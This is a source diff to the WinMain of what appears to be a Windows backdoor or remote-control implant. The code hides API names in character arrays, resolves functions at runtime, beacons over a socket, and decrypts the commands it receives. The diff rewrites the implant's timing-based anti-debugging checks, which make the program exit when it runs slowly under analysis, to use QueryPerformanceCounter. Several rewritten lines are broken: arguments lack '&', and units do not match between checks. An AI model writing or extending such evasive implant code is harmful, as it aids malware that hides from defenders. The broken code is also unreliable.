@@ -440,10 +440,13 @@ WinMain(HINSTANCE hInstance,
 		int nCmdShow)
 {
 #if !DEBUG	
-	unsigned __int64 cycleCountDiff;
-	unsigned __int64 cycleCountStart;
+	LONGLONG cycleCountDiff;
+	LARGE_INTEGER performanceCounterStart;
+	LARGE_INTEGER performanceCounterCurrent;
+	LARGE_INTEGER performanceFrequency;
 
-	cycleCountStart = __rdtsc();
+	QueryPerformanceFrequency(&performanceFrequency);
+	QueryPerformanceCounter(&performanceCounterStart);
 #endif	
 	
 	char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
@@ -506,16 +509,21 @@ WinMain(HINSTANCE hInstance,
 	char ca_CloseHandle[] = { 'C','l','o','s','e','H','a','n','d','l','e',0 };
 	gf_CloseHandle = (_CloseHandle*)GetProcAddress(gLibraryKernel32, ca_CloseHandle);
 
-#if !DEBUG	
-	cycleCountDiff = __rdtsc() - cycleCountStart;		
-	if ( cycleCountDiff >= 1000000000 )
+#if !DEBUG
+	QueryPerformanceCounter(&performanceCounterCurrent);
+	cycleCountDiff = (performanceCounterCurrent.QuadPart - performanceCounterStart.QuadPart) / performanceFrequency.QuadPart;
+	if ( cycleCountDiff > 1 )
 		return 1;
+
+	char buffer[256];
+	sprintf_s(buffer, "%I64d\n", cycleCountDiff);
+	OutputDebugStringA(buffer);
 #endif	
 	
 	for(;;)
 	{
-#if !DEBUG		
-		cycleCountStart = __rdtsc();
+#if !DEBUG
+		QueryPerformanceCounter(performanceCounterStart);
 #endif		
 		
 		WSADATA wsaData;
@@ -591,9 +599,10 @@ WinMain(HINSTANCE hInstance,
 			Sleep(10000);
 		}
 
-#if !DEBUG		
-		cycleCountDiff = __rdtsc() - cycleCountStart;		
-		if ( cycleCountDiff >= 1000000000 )
+#if !DEBUG
+		QueryPerformanceCounter(performanceCounterCurrent);
+		cycleCountDiff = performanceCounterCurrent.QuadPart - performanceCounterStart.QuadPart;		
+		if ( cycleCountDiff > 1 )
 			return 1;
 #endif		
 	}
@@ -627,8 +636,8 @@ WinMain(HINSTANCE hInstance,
 			OutputDebugStringA("Error receiving message.");
 #endif			
 		}
-#if !DEBUG		
-		cycleCountStart = __rdtsc();
+#if !DEBUG
+		QueryPerformanceCounter(performanceCounterStart);
 #endif		
 
 		EncryptDecryptString(recvBuffer, SOCKET_BUFFER_SIZE);
@@ -681,13 +690,11 @@ WinMain(HINSTANCE hInstance,
 		OutputDebugStringA("\n");
 
 #if !DEBUG
-		cycleCountDiff = __rdtsc() - cycleCountStart;		
-		if ( cycleCountDiff >= 1000000000 )
+		QueryPerformanceCounter(performanceCounterCurrent);
+		cycleCountDiff = performanceCounterCurrent.QuadPart - performanceCounterStart.QuadPart;		
+		if ( cycleCountDiff > 1 )
 			return 1;
-		
-		// char buffer[256];
-		// sprintf_s(buffer, "%I64d\n", cycleCountDiff);
-		// OutputDebugStringA(buffer);
+
 #endif		
 		
 		Sleep(3000);
